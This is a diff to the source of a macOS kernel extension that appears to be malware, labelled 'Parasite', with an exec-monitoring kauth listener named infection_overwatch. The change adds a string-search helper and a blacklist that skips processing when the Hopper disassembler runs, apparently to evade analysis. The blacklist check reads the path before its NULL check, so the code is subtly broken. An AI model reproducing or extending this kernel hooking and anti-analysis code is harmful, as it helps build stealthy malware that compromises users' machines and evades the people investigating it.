@@ -1,3 +1,5 @@
+#include <IOKit/IOLib.h>
+
 extern "C" {
     
 #include <mach/mach_types.h>
@@ -23,11 +25,38 @@ extern "C" {
 struct kernel_info g_kinfo;
 static boolean_t kernel_symbols_solved = FALSE;
 static kauth_listener_t listener = NULL;
+    
+#define BLACKLIST(PROCESS) if (_strstr(path, #PROCESS)) return KAUTH_RESULT_DEFER;
+    
+char* _strstr(const char *in, const char *str)
+{
+    char c;
+    size_t len;
+    
+    c = *str++;
+    if (!c)
+        return (char *) in;	// Trivial empty string case
+    
+    len = strlen(str);
+    do {
+        char sc;
+        
+        do {
+            sc = *in++;
+            if (!sc)
+                return (char *) 0;
+        } while (sc != c);
+    } while (strncmp(in, str, len) != 0);
+    
+    return (char *) (in - 1);
+}
 
 static int infection_overwatch(kauth_cred_t credential, void *idata, kauth_action_t action, uintptr_t arg0, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3)
 {
     if (action == KAUTH_FILEOP_EXEC) {
         char *path = (char *)arg1;
+        
+        BLACKLIST(Hopper);
         
         if (path != NULL) {
             printf("[Parasite] %s\n", path);
